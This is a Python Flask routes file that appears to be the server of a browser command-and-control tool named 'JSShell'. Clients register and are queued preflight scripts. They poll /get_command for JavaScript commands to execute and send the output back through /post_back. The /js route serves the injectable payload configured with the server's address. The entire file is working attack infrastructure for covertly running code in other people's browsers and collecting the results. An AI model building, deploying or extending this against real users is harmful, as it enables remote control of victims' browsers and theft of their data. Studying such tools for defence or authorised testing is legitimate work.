from flask import render_template, request
import json

from app import app, db
from .models import Client, Command
from .preflight_scripts import pf_scripts


@app.route('/')
def index():
    """ Main Page """
    return render_template('index.html',
                           url=app.config.get('URL'),
                           port=app.config.get('PORT'),
                           debug=app.config.get('DEBUG'))


@app.route('/register', methods=['POST'])
def register():
    """ Register a new client """

    if request.method == 'POST':
        client_id = request.form.get('uuid','')
        user_agent = request.form.get('user_agent','')
        ip = request.remote_addr

        if client_id and user_agent and ip:
            print("Register: ", client_id)

            c = Client(client_id, user_agent, ip)
            db.session.add(c)

            # add pre flight scripts
            c.add_commands(pf_scripts)

            db.session.commit()

            return 'Hello {}!'.format(client_id)
        else:
            return 'UUID is not present'


@app.route('/get_command/<client_uuid>')
def get_command(client_uuid):
    """ The Client tries to fetch a command """

    c = Client.query.filter_by(client_id=client_uuid).first()

    if not c:
        return json.dumps({'error': 'general error'})

    c.update_beacon()
    db.session.commit()

    for com in c.commands:
        if not com.is_served:
            com.is_served = True
            db.session.commit()
            return json.dumps({'success' : com.cmd, 'cmd_id' : com.id})

    return json.dumps({'error': 'no command available'})


@app.route('/post_back', methods=['POST'])
def post_back():
    """ The Client has completed a command and posts the output back """

    if request.method == 'POST':
        client_id = request.form.get('uuid', '')
        cmd_id = request.form.get('cmd_id', '')
        output = request.form.get('output', '')

        if client_id and cmd_id:
            c = Command.query.filter_by(id=cmd_id).first()
            if c:
                c.output = output
                c.is_returned = True
                db.session.commit()

        return '200'


@app.route('/js')
def get_js_file():
    """ Render the JSShell code with the config """

    dbg = 'true' if str(app.config.get('DEBUG')) == 'True' else 'false'

    return render_template('jss_template.js',
                           url=app.config.get('URL'),
                           port=app.config.get('PORT'),
                           debug=dbg)